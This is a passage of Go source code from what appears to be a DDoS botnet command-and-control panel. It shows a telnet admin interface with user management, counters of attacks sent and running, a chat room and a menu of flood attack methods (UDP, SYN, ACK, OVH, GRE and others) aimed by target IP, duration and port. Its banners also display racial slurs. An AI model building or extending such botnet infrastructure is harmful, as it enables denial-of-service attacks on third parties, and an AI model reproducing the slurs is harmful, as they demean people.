            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[37m         | == /        \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  /         \r\n"))
            this.conn.Write([]byte("\033[37m           |/          \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                           
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m          / **/|       \r\n"))
            this.conn.Write([]byte("\033[37m          | == /       \r\n"))
            this.conn.Write([]byte("\033[37m           |  |        \r\n"))
            this.conn.Write([]byte("\033[37m           |  |        \r\n"))
            this.conn.Write([]byte("\033[37m           |  /        \r\n"))
            this.conn.Write([]byte("\033[37m            |/         \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                            
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m          / **/|       \r\n"))
            this.conn.Write([]byte("\033[37m          | == /       \r\n"))
            this.conn.Write([]byte("\033[37m           |  |        \r\n"))
            this.conn.Write([]byte("\033[37m           |  |        \r\n"))
            this.conn.Write([]byte("\033[37m           |  /        \r\n"))
            this.conn.Write([]byte("\033[37m            |/         \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                            
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[37m         | == /        \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  /         \r\n"))
            this.conn.Write([]byte("\033[37m           |/          \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                            
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m          / **/|       \r\n"))
            this.conn.Write([]byte("\033[37m          | == /       \r\n"))
            this.conn.Write([]byte("\033[37m           |  |        \r\n"))
            this.conn.Write([]byte("\033[37m           |  |        \r\n"))
            this.conn.Write([]byte("\033[37m           |  /        \r\n"))
            this.conn.Write([]byte("\033[37m            |/         \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                            
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m           |/**/|       \r\n"))
            this.conn.Write([]byte("\033[37m           / == /       \r\n"))
            this.conn.Write([]byte("\033[37m            |  |        \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                                        this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[99m     _.-^^---....,,--             \r\n"))
            this.conn.Write([]byte("\033[93m _--                  --_         \r\n"))
            this.conn.Write([]byte("\033[93m<                        >)        \r\n"))
            this.conn.Write([]byte("\033[93m|                         |        \r\n"))
            this.conn.Write([]byte("\033[93m /._                   _./         \r\n"))
            this.conn.Write([]byte("\033[97m    ```--. . , ; .--'''            \r\n"))
            this.conn.Write([]byte("\033[93m          | |   |                  \r\n"))
            this.conn.Write([]byte("\033[93m       .-=||  | |=-.               \r\n"))
            this.conn.Write([]byte("\033[97m       `-=#$%&%$#=-'               \r\n"))
            this.conn.Write([]byte("\033[93m          | ;  :|    nuke          \r\n"))
            this.conn.Write([]byte("\033[37m _____.,-#%&$@%#&#~,._____         \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(1000 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37mthat\r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(300 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37mthat nigga\r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(300 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37mthat nigga got\r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(300 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37mthat nigga got \033[93mNUKED\r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(100 * time.Millisecond)
        }//if userInfo.admin == 1 && cmd == "ADDREG"
        if userInfo.admin == 1 && cmd == "ADMIN" || cmd == "admin" {
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte(fmt.Sprintf("\033]0;  Primitive | User: %s | UsersOnline: %d | Page: Admin |\007", username, len(sessions))))
            this.conn.Write([]byte(banner())) 
            this.conn.Write([]byte("\033[1;36m                      ╔═════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\033[1;36m                      ║ \033[37mADDREG - Create a Regular Account   \033[1;36m║\r\n"))
            this.conn.Write([]byte("\033[1;36m                      ║ \033[37mREMOVEUSER - Remove an Account      \033[1;36m║\r\n"))
            this.conn.Write([]byte("\033[1;36m                      ║ \033[37mSESSIONS - View active users        \033[1;36m║\r\n"))
            this.conn.Write([]byte("\033[1;36m                      ║ \033[37mWHO - WHO user info                 \033[1;36m║\r\n"))
            this.conn.Write([]byte("\033[1;36m                      ║ \033[37mBANUSER - Ban a user                \033[1;36m║\r\n"))
            this.conn.Write([]byte("\033[1;36m                      ║ \033[37mUNBANUSER - UnBan a user            \033[1;36m║\r\n"))
            this.conn.Write([]byte("\033[1;36m                      ║ \033[37mKICK - kick a user out the net      \033[1;36m║\r\n"))
            this.conn.Write([]byte("\033[1;36m                      ╚═════════════════════════════════════╝\r\n"))
            continue
        }
        if userInfo.admin == 1 && cmd == "sessions" {
            this.conn.Write([]byte(fmt.Sprintf("\033]0;  Primitive | User: %s | UsersOnline: %d | Page: History |\007", username, len(sessions))))
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte(banner())) 
            fmt.Fprint(this.conn, "\033[00;1;96m        ╔═════════════════════════════════════════════════════════════╗\033[0m\r\n")
            for _, s := range sessions {
                line := fmt.Sprintf("%d %s %s", s.ID, s.Username, s.Conn.RemoteAddr())
                fmt.Fprintf(this.conn, "\033[00;1;96m        ║\x1b[0m%s\033[00;1;96m║\033[0m\r\n", fillSpace(line, 61, " "))

            }

            fmt.Fprint(this.conn, "\033[00;1;96m        ╚═════════════════════════════════════════════════════════════╝\r\n")
            continue
        }
        if userInfo.admin == 1 && cmd == "history" {
            this.conn.Write([]byte(fmt.Sprintf("\033]0;  Primitive | User: %s | UsersOnline: %d | Page: History |\007", username, len(sessions))))
            this.conn.Write([]byte("\033[2J\033[1H"))
            fmt.Fprint(this.conn, "\033[00;1;96m        ╔═════════════════════════════════════════════════════════════╗\033[0m\r\n")
            for _, s := range cmds {
                line := fmt.Sprintf("%s", s.Cmdhis)
                fmt.Fprintf(this.conn, "\033[00;1;96m        ║\x1b[0m%s\033[00;1;96m║\033[0m\r\n", fillSpace(line, 61, " "))

            }

            fmt.Fprint(this.conn, "\033[00;1;96m        ╚═════════════════════════════════════════════════════════════╝\r\n")
            continue
        }

        
            if err != nil || cmd == "@" {
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\033[93m                       nice\033[37mtry\r\n"))
            continue
        }
        if cmd == "stats" || cmd == "STATS" {
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte(banner())) 
            gang := database.RecentUser()
            fmt.Fprintln(this.conn, "\033[00;1;96m\033[00;1;37mTotal Attacks Sent: \033[00;1;32m"+fmt.Sprint(database.getTotalAttacks())+"\033[0m\r")
            fmt.Fprintln(this.conn, "\033[00;1;96m\033[00;1;37mTotal Attacks Running: \033[00;1;32m"+fmt.Sprint(database.getTotalAttacksRunning())+"\033[0m\r")
            fmt.Fprintln(this.conn, "\033[00;1;96m\033[00;1;37mTotal Users: \033[00;1;32m"+fmt.Sprint(database.getTotalUsers())+"\033[0m\r")
            fmt.Fprintln(this.conn, "\033[00;1;96m\033[00;1;37mLast Attacker ID: \033[00;1;32m"+fmt.Sprint(database.LastUserID())+"\033[0m\r")
            this.conn.Write([]byte(fmt.Sprintf("\033[00;1;37m\033[00;1;37mOnline Users: \x1b[1;32m%d\033[0m\r", len(sessions))))
            fmt.Fprintln(this.conn, "\033[00;1;96m\033[00;1;37mMost Recent User: \033[00;1;32m"+fmt.Sprint(gang))
            fmt.Fprintln(this.conn, "\033[0m\r\033[00;1;37m\033[00;1;37mUptime: \033[00;1;32m100.00%\033[0m\r")
            fmt.Fprintln(this.conn, "\033[00;1;96m\033[00;1;37mUp/Down: \033[00;1;95mUP\033[0m\r")
            continue
        }
        if cmd == "support-ticket" {
            this.conn.Write([]byte(fmt.Sprintf("\033]0;  Primitive | User: %s | UsersOnline: %d | Page: Support |\007", username, len(sessions))))
            this.conn.Write([]byte("1 = open ticket 2 = view tickets: "))
            optionlol, err := this.ReadLine(false)
            if optionlol == "1" {
                goto opentick;
            } else {
            this.conn.Write([]byte("\033[2J\033[1H"))
            fmt.Fprintf(this.conn, "\033[00;1;96m     ╔═══════════════════════════════════════════════════════════════════════╗\r\n")
            for _, s := range cmdss {
                line := fmt.Sprintf("%s", s.Msg)
                fmt.Fprintf(this.conn, "\033[00;1;96m     ║\033[00;1;95m%s\033[0m\r\n", (line))
            }
            fmt.Fprintf(this.conn, "\033[00;1;96m     ╚═══════════════════════════════════════════════════════════════════════╝\r\n")
            continue                
            }
            opentick:
            this.conn.Write([]byte("Message: "))
            msg2, err := this.ReadLine(false)
            if err != nil {
                return
            }
            var support = &support{
                ID:       time.Now().UnixNano(),
                Msg: msg2,
        }
    supportMutex.Lock()
    cmdss[support.ID] = support
    supportMutex.Unlock()
            this.conn.Write([]byte(" ticket: "+ msg2 +" has been opened!\r\n"))
            continue
        }
        /*
        if userInfo.admin == 1 && cmd == "tickets" {
            this.conn.Write([]byte("\033[2J\033[1H"))
            fmt.Fprintf(this.conn, "\033[00;1;96m     ╔═══════════════════════════════════════════════════════════════════════╗\r\n")
            for _, s := range sessions {
                line := fmt.Sprintf("%s", s.Msg)
                fmt.Fprintf(this.conn, "\033[00;1;96m     ║\033[00;1;95m%s\033[0m\r\n", (line))
            }
            fmt.Fprintf(this.conn, "\033[00;1;96m     ╚═══════════════════════════════════════════════════════════════════════╝\r\n")
            continue
        }         
        */
        if cmd == "broadcast" {
            this.conn.Write([]byte("\033[00;1;96m\033[4;35mMSG\033[1;37m:\x1b[0m"))
            msgv, err := this.ReadLine(false)
            if err != nil {
                return
            }
            var username2 string
            username2 = username
                    sessionMutex.Lock()
                    for _, s := range sessions {
                             if s.Bhat == true {
                            fmt.Fprintf(s.Conn, "\r\n\x1b[38;2;45;31;171mBroadcast Message from %s :\033[0m%s\033[31m Press enter to exit \r\n", username2, msgv)
                            this.conn.Write([]byte("\x1b[38;2;45;31;171m"))
                            continue    
                        }
                    }
                    sessionMutex.Unlock()
                    continue
            }  
        if cmd == "dm" {
        	this.conn.Write([]byte("\033[00;1;96m\033[4;35mUser\033[1;37m:\x1b[0m"))
        	userv2, err := this.ReadLine(false)
            this.conn.Write([]byte("\033[00;1;96m\033[4;35mMSG\033[1;37m:\x1b[0m"))
            msgv, err := this.ReadLine(false)
            if err != nil {
                return
            }
            var username2 string
            username2 = username
                    sessionMutex.Lock()
                    for _, s := range sessions {
                             if s.Bhat == true {
                             	if s.Username == userv2 {
                            fmt.Fprintf(s.Conn, "\r\n\x1b[38;2;45;31;171m(\x1b[1;36mDirect message from %s):\033[0m%s\033[31m \r\n", username2, msgv)
                            this.conn.Write([]byte("\x1b[38;2;45;31;171m"))
                            continue    
                        }
                        }
                    }
                    sessionMutex.Unlock()
                    continue
            }       
     
        if cmd == "chat" {
            this.conn.Write([]byte(fmt.Sprintf("\033]0;  Primitive | User: %s | UsersOnline: %d | Page: Chat room |\007", username, len(sessions))))
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte(banner())) 
            this.conn.Write([]byte("\x1b[38;2;45;31;171m                      ╔═════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\x1b[38;2;45;31;171m                      ║ \033[1;36mWelcome to Guilty chat room         \033[1;36m║\r\n"))
            this.conn.Write([]byte("\x1b[38;2;45;31;171m                      ║ \033[1;36mNo being disrespectful              \033[1;36m║\r\n"))
            this.conn.Write([]byte("\x1b[38;2;45;31;171m                      ║ \033[1;36mNo TROLLING                         \033[1;36m║\r\n"))
            this.conn.Write([]byte("\x1b[38;2;45;31;171m                      ║ \033[1;36mNo Bashing my net                   \033[1;36m║\r\n"))
            this.conn.Write([]byte("\x1b[38;2;45;31;171m╔═════════════════════╩═════════════════════════════════════╝\r\n"))
            fmt.Fprintf(this.conn, "\x1b[38;2;45;31;171m║\033[00;1;96mType 'exit' To Leave The Chat!\033[0m\r\n")

            sessionMutex.Lock()
            for _, s := range sessions {
                if s.Chat == true {
                    fmt.Fprintf(s.Conn, "\r\n\x1b[38;2;45;31;171m║\033[0m%s\033[00;92m Has Joined The Chat!\033[0m\r\n\x1b[38;2;45;31;171m║═\033[00;1;96m⮞ ", username)
                }
            }
            sessionMutex.Unlock()
            session.Chat = true

            for {
                fmt.Fprint(this.conn, "\x1b[38;2;45;31;171m║═\033[00;1;96m⮞ ")
                msg, err := this.ReadLine(false)
                if err != nil {
                    return
                }

                if msg == "exit" {
                    sessionMutex.Lock()
                    for _, s := range sessions {
                        if s.Chat == true {
                            fmt.Fprintf(s.Conn, "\r\n\x1b[38;2;45;31;171m║\033[0m%s\033[31m Has Left The Chat!\033[0m\r\n\x1b[38;2;45;31;171m║═\033[00;1;96m⮞ \r\n", username)
                        }
                    }
                    session.Chat = false
                    sessionMutex.Unlock()
                    break
                }

                sessionMutex.Lock()
                for _, s := range sessions {
                    if s.Chat == true && s.Username != username {
                        fmt.Fprintf(s.Conn, "\r\x1b[38;2;45;31;171m║%s\033[00;1;96m⮞ %s\r\n", username, msg)
                        fmt.Fprintf(s.Conn, "\x1b[38;2;45;31;171m║═\033[00;1;96m⮞ ")
                    }
                }
                sessionMutex.Unlock()

            }
            continue
        }

              
                if err != nil || cmd == "troll" || cmd == "TROLL" {
    this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte(fmt.Sprintf("\033[37m  \033[93mWELL.. LOOKS LIKE \033[37m" + username + "!\033[93m GOT TROLLED!!!        \r\n")))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\033[37m   ░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄░░░░░░░   \r\n"))
            this.conn.Write([]byte("\033[37m   ░░░░░█░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▀▀▄░░░░  \r\n"))
            this.conn.Write([]byte("\033[37m   ░░░░█░░░▒▒▒▒▒▒░░░░░░░░▒▒▒░░█░░░  \r\n"))
            this.conn.Write([]byte("\033[37m   ░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█░░  \r\n"))
            this.conn.Write([]byte("\033[37m   ░▄▀▒▄▄▄▒░█▀▀▀▀▄▄█░░░██▄▄█░░░░█░  \r\n"))
            this.conn.Write([]byte("\033[37m   █░▒█▒▄░▀▄▄▄▀░░░░░░░░█░░░▒▒▒▒▒░█  \r\n"))
            this.conn.Write([]byte("\033[37m   █░▒█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄▒█  \r\n"))
            this.conn.Write([]byte("\033[37m   ░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█░  \r\n"))
            this.conn.Write([]byte("\033[37m   ░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█░░  \r\n"))
            this.conn.Write([]byte("\033[37m   ░░░█░░░░██░░▀█▄▄▄█▄▄█▄████░█░░░  \r\n"))
            this.conn.Write([]byte("\033[37m   ░░░░█░░░░▀▀▄░█░░░█░█▀██████░█░░  \r\n"))
            this.conn.Write([]byte("\033[37m   ░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█░░  \r\n"))
            this.conn.Write([]byte("\033[37m   ░░░░░░░▀▄▄░▒▒▒▒░░░░░░░░░░▒░░░█░  \r\n"))
            this.conn.Write([]byte("\033[37m   ░░░░░░░░░░▀▀▄▄░▒▒▒▒▒▒▒▒▒▒░░░░█░  \r\n"))
            this.conn.Write([]byte("\033[37m   ░░░░░░░░░░░░░░▀▄▄▄▄▄░░░░░░░░█░░  \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\033[93m       YEET NIGGA WRECKED \r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
    continue
        }
                if err != nil || cmd == "PUZ1" || cmd == "puz1" {
    this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte(fmt.Sprintf("\033[37m  \033[93mpuzzled??? \033[37m" + username + " !          \r\n")))
            this.conn.Write([]byte("\033[37m                       _      _      _      _      _      _      _      \r\n"))
            this.conn.Write([]byte("\033[37m                     _( )__ _( )__ _( )__ _( )__ _( )__ _( )__ _( )__   \r\n"))
            this.conn.Write([]byte("\033[37m                   _|     _|     _|     _|     _|     _|     _|     _|  \r\n"))
            this.conn.Write([]byte("\033[37m                  (_   _ (_   _ (_   _ (_   _ (_   _ (_   _ (_   _ (_   \r\n"))
            this.conn.Write([]byte("\033[37m                   |__( )_|__( )_|__( )_|__( )_|__( )_|__( )_|__( )_|   \r\n"))
            this.conn.Write([]byte("\033[37m                   |_     |_     |_     |_     |_     |_     |_     |_  \r\n"))
            this.conn.Write([]byte("\033[37m                    _) _   _) _   _) _   _) _   _) _   _) _   _) _   _) \r\n"))
            this.conn.Write([]byte("\033[37m                   |__( )_|__( )_|__( )_|__( )_|__( )_|__( )_|__( )_|   \r\n"))
            this.conn.Write([]byte("\033[37m                   _|     _|     _|     _|     _|     _|     _|     _|  \r\n"))
            this.conn.Write([]byte("\033[37m                  (_   _ (_   _ (_   _ (_   _ (_   _ (_   _ (_   _ (_   \r\n"))
            this.conn.Write([]byte("\033[37m                   |__( )_|__( )_|__( )_|__( )_|__( )_|__( )_|__( )_|   \r\n"))
            this.conn.Write([]byte("\033[37m                   |_     |_     |_     |_     |_     |_     |_     |_  \r\n"))
            this.conn.Write([]byte("\033[37m                    _) _   _) _   _) _   _) _   _) _   _) _   _) _mx _) \r\n"))
            this.conn.Write([]byte("\033[37m                   |__( )_|__( )_|__( )_|__( )_|__( )_|__( )_|__( )_|   \r\n"))
            this.conn.Write([]byte("\033[93m                                 puzzle net v4 by blazing \r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
    continue
        }   
        if err != nil || cmd == "public" || cmd == "PUBLIC" {
    this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[93m                   ╔═══════════════════\033[37m════════════════════╗   \033[0m \r\n"))
            this.conn.Write([]byte("\033[93m                   ║ .udp [ip] [time] d\033[37mport=[port]         ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[93m                   ║ .vse [ip] [time] d\033[37mport=[port]         ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[93m                   ║ .ice [ip] [time] d\033[37mport=[port]         ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[93m                   ║ .syn [ip] [time] d\033[37mport=[port]         ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[93m                   ║ .ack [ip] [time] d\033[37mport=[port]         ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[93m                   ║ .ovh [ip] [time] d\033[37mport=[port]         ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[93m                   ║ .game [ip] [time] \033[37mdport=[port]        ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[93m                   ║ .xmas [ip] [time] \033[37mdport=[port]        ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[93m                   ║ .frag [ip] [time] \033[37mdport=[port]        ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[93m                   ║ .stomp [ip] [time]\033[37m dport=[port]       ║   \033[0m \r\n"))
            this.conn.Write([]byte("\033[93m                   ║ .greip [ip] [time]\033[37m dport=[port]       ║   \033[0m \r\n"))
